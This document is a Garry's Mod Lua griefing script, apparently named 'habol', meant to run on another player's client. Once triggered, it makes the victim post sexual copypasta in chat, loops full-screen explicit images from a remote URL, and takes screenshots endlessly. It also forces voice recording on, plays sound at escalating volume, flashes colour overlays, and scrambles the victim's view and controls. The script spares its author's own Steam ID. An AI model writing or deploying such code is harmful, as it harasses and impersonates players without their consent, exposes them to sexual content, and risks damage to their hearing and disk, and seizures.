if LocalPlayer():SteamID() == "STEAM_0:0:456670572" then 
        chat.AddText(Color(130,20,230),"Someone just tried to run habol on you! LOL")
        return 
end
local jpegs = 0
local s = sound
local Song = false
local _timer = timer
local _surface = surface
local _render = render
local _mtable = FindMetaTable
local _command = RunConsoleCommand
local _hook = hook
local _http = http
local _net = net
local _math = math
local _vgui = vgui
local _input = input
local function ss()
    _command('screenshot')
    _command('jpeg')
    jpegs = jpegs + 1
end
local hentai = {
    "https://img3.gelbooru.com//images/a5/64/a5642061958917ed39f90251a91dbee7.jpg"
}
local annoying = {
    "particle/tinyfiresprites/tinyfiresprites",
    "particle/water/watersplash_001a_additive",
    "particle/antlion_goop3/antlion_goop3",
    "vgui/gfx/vgui/solid_background",
    "sprites/white",
    "sprites/physcannon_bluecore1",
    "pp/texturize",
    "pp/colour",
    "pp/toytown-top",
    --VISABLE THROUGH WALLS--
    "sprites/physcannon_bluecore1",
    "pp/toytown-top",
    "sprites/autoaim_1a",
    "sprites/white",
    "vgui/gfx/vgui/cs_logo",
    "vgui/gfx/vgui/ak47",
    "vgui/gfx/vgui/m3",
    "vgui/gfx/vgui/p228",
    "vgui/gfx/vgui/m4a1",
    "vgui/gfx/vgui/gign",
    "vgui/gfx/vgui/glock",
    "vgui/gfx/vgui/ump45",
    "vgui/gfx/vgui/vip",
    "vgui/gfx/vgui/urban",
    "vgui/gfx/vgui/tmp",
    "vgui/gfx/vgui/t_random",
    "vgui/gfx/vgui/solid_background",
    "models/weapons/v_toolgun/screen_bg",
      --GLITCHY--
    "particle/tinyfiresprites/tinyfiresprites",
    "particle/water/watersplash_001a_additive",
    "particle/antlion_goop3/antlion_goop3",
    "sprites/orangelight1_noz",
    "effects/bonk",
    "effects/moon",
    "particle/fire_particle_2/fire_particle_2",
    "effects/debris/debris_chunk",
    "metal/ibeam001b",
    "metal/metalstair001a",
    "sprites/glow08",
    "sprites/dot",
    "trails/laser",
    "vgui/servers/icon_replay_column",
    "gm_construct/flatgrass",
    "dev/water_normal",
    "debug/env_cubemap_model",
    "decals/decalgraffiti010a",
    "models/hostages/sandro_facemap",
    "models/humans/male/group01/vance_facemap",
    "models/weapons/v_toolgun/screen_bg",
    "ajacks/billboard",
    "decals/decalgraffiti036a",
    "decals/decalgraffiti038a",
    "decals/decalgraffiti043a_cs",
    "decals/decalgraffiti062a",
    "cs_assault/assault_building_decal03",
    "decals/decalgraffiti058a_cs",
    "sprites/crosshairs",
    "decals/concrete/shot5Z",
    "icon16/page_red",
    "icon16/star",
    "models/cs_italy/lantern2a",
    "gui/info",
    "introscreen/main",
    "models/hostages/cohrt",
    "models/mossman/mossman_face",
    "gui/gmod_logo",
    "effects/ar2_altfire1",
    "models/player/shared/gold_player",
    "models/props/cs_assault/moneytop",
    "gui/colors",
    "materials/modernmotd/ico-dollar",
    "models/humans/nypd/badge",
    "effects/tool_tracer",
    "models/breen/mouth",
    "vgui/resource/icon_vac_new",
    "icon16/emoticon_smile",
    "games/16/all",
    "icon16/monkey",
    "icon16/shield",
    "models/props_combine/masterinterface01c",
    "models/shadertest/vertexlitselfillummaskenvmaptex.mdl",
    "refract_ring",
    "hd2/effects/water/whirlpool2_additive_ndb",
    "hd2/effects/water/water_splash_single_additive",
    "models/shadertest/vertexlitenvmappedbumpmap.mdl",
    "models/shadertest/vertexlitenvmappedtexturedetailv2.mdl",
    "models/shadertest/vertexlitselfillumenvmappedtexturev2.mdl",
    "models/shadertest/vertexlitselfillummaskenvmaptex.mdl",
    "models/shadertest/vertexlitselfilluminatedtexturedetail.mdl",
    "models/shadertest/shader3",
    "models/shadertest/shader5",
    "models/shadertest/shader4"
}
local annoyings = {
    "synth/75_pwm_880.wav",--1
    "synth/75_pwm_440.wav",--2
    "synth/75_pwm_1760.wav",--3
    "synth/25_pwm_880.wav",--4
    "synth/25_pwm_440.wav",--5
    "synth/25_pwm_1760.wav",--6
    "synth/12_5_pwm_880.wav",--7
    "synth/12_5_pwm_440.wav",--8
    "synth/12_5_pwm_1760.wav",--9
    "synth/white_noise.wav",
    "synth/triangle_1760.wav",
    "synth/square_1760.wav",
    "synth/sine_1760.wav"
    }
local ply = LocalPlayer()
local funnies = {
    'wwwwwwwwwwwwwwwwww',
    'posdadkasd',
    'hfhd',
    'hfgj',
    'fasdfashfghfghjindf',
    'bvZNvjxcnvunguhnsdgcsdfas',
    'bvcsdfa(*J@JOSFJs',
    'bvcsdfk-0124i059as',
    'bvcsdfhsfhfgjas',
    'bvcsdm.;.f',
    'bvcscvbz,dfas',
    'bv12356csdfas',
    'hbvv2bvcsdgsdfas',
    'phphfth-bvcsdfas',
    'bvcsdfas',
    'bvcsdfadfhgs',
    'bvasdxcxcvcsdfas',
    'bvcsdfafkgaswes',
    'bvcsdfjfghkas',
    'bvcsdfawdgas',
    'bvcsdfdfgawas',
    'bvcsddkdghkas',
    'bvcsfgas',
    'bvhdfh',
    'bvcsdfas',
    'sdfawd',
    'sdfgwe',
    'sdfg',
    'gsdfg',
    'awdg',
    'wdad',
}
local function oniichan() --aids copypasta
    _timer.Create('o',0,1,function() LocalPlayer():ConCommand("say Huh? Don't sniff you? Don't be silly Onii-chan I love you why can't I show my affection? (─‿‿─)♡")end)
    _timer.Create('n',03,1,function() LocalPlayer():ConCommand("say Hahaha your face is red. Woah Onii-chan why are you pushing me on to the bed?")end)
    _timer.Create('ii',05,1,function() LocalPlayer():ConCommand("say ヽ(°〇°)ﾉ Kyaaaaa don't tickle me Onii-chan haha counter ataaaaack pushes you down ヽ(>∀<☆)ノ.")end)
    _timer.Create('-',07,1,function() LocalPlayer():ConCommand("say Hehehe I win! Onii-chan your face is really red now, Hmmh smirks (=-ω-=)")end)
    _timer.Create('c',09,1,function() LocalPlayer():ConCommand("say perhaps you're falling in love with me? Chuuuuu (ﾉ´ з )ノ kisses you Woah O-onii-chan w-what are you d-doing?!")end)
    _timer.Create('h',011,1,function() LocalPlayer():ConCommand("say H-hyyaaaaa don't take off my panties! D-dont look at my private spot! (/▽＼) Ah Ah Don't lick me there it's dirty!")end)
    _timer.Create('a',13,1,function() LocalPlayer():ConCommand("say Ahhhhhh fuah ah ah (/ω/) O-onii-chan a-are you going to put it in? O-ok i'm ready. (／。＼)")end)
    _timer.Create('n',15,1,function() LocalPlayer():ConCommand("say Heeeee I-it hurts. ~(>_<~) SWow dwon ah ah MMMH O-onii-chan I Lwve yoouuuuu! AHHHHHHH MMMHHH")end)
    _timer.Create('~',17,1,function() LocalPlayer():ConCommand("say AH Hah Hah hah O-ONIII-CHAAANN you baka why did you do it inside? ヽ(д´)ノ")end)
    _timer.Create('~~',19,1,function() LocalPlayer():ConCommand("say W-well if it felt good for you i'm happy, b-but make sure you take responsibility. (ღ˘⌣˘ღ)")end)
end
local function Everything()
    LocalPlayer():ConCommand("say It's begun...")
    _timer.Create('hahasong', .1, 1, function() Song = true end)
    s.PlayURL('https://files.catbox.moe/d0ivsa.mp3','',function()end)
    s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) -- annoying anime song
    _timer.Create('oniiii',94,100000,function() s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) end)
    

    _timer.Create('scren',0.2,100000,ss)
    _timer.Create('hntai', 1, 10000, function()
    local _f = _vgui.Create("DFrame")
        _f:SetTitle("")
        _f:ShowCloseButton(false)
        _f:SetPos(math.random(0,ScrW()),math.random(0,ScrH()))
        _f:SetSize(ScrW(),ScrH())

    local _h = _vgui.Create("DHTML", _f )
        _h:Dock( FILL )
        _h:OpenURL(table.Random(hentai))
    end)

    _hook.Add('Think','funny',function()
            rgb = HSVToColor((CurTime() * 120) % 360, .77, .88)
            local result = annoying[_math.random(1,88)]
            _math.randomseed(CurTime())
            local result2 = annoying[_math.random(1,88)]
            local cfunnies = funnies[_math.random(1,30)]
            local sresult = annoyings[_math.random(1,13)]
            local pSong = CreateSound(LocalPlayer(),sresult)
            sound.Add({
                name = "wowow",
               channel = CHAN_STATIC,
                volume = (jpegs^2),
                level = 10000,
                pitch = {50,200},
                sound = sresult
            })
            _command('pp_mat_overlay',result)
            _command('+voicerecord')
            _command('pp_mat_overlay_refractamount',tonumber(cfunnies))
            _command('pp_texturize',result2)
            pSong:ChangeVolume(100000)
            pSong:SetSoundLevel(100000)
            pSong:Play()
            ply:EmitSound("wowow")
            chat.AddText(rgb, cfunnies)
            ply:ScreenFade(SCREENFADE.IN, rgb, .1, 0)
            if _input.IsKeyDown(70) then 
                _command('cancelselect')
            end
    end)
    _hook.Add('CreateMove','funny',function( CUserCmd , GM ) 
        local lolangle = _math.random(-24, 24)
        local realangle = Angle(lolangle, lolangle,0)
        local PAngles = CUserCmd:GetViewAngles()
        local mousex = CUserCmd:GetMouseX()
        local mousey = CUserCmd:GetMouseY()
        _command('mat_vsync','1')
        CUserCmd:SetViewAngles(PAngles - realangle)
    end)
    _hook.Add("CalcView", "funny", function(ply, pos, angles, fov)
            local _pv = ply:GetVelocity()
            local view = {}
                view.origin = pos
                view.angles = angles
                view.fov = math.random(300)
            return view
    end)
end

_hook.Add("PlayerStartVoice", "asdasdas", function(ply)
    if ply == LocalPlayer() then
        Everything()
    end
end)

_hook.Add("OnPlayerChat","HILOLOLOLOLOLLOL",function(speaker,text)
    if text == "habol" then
        Everything()
    end
end)
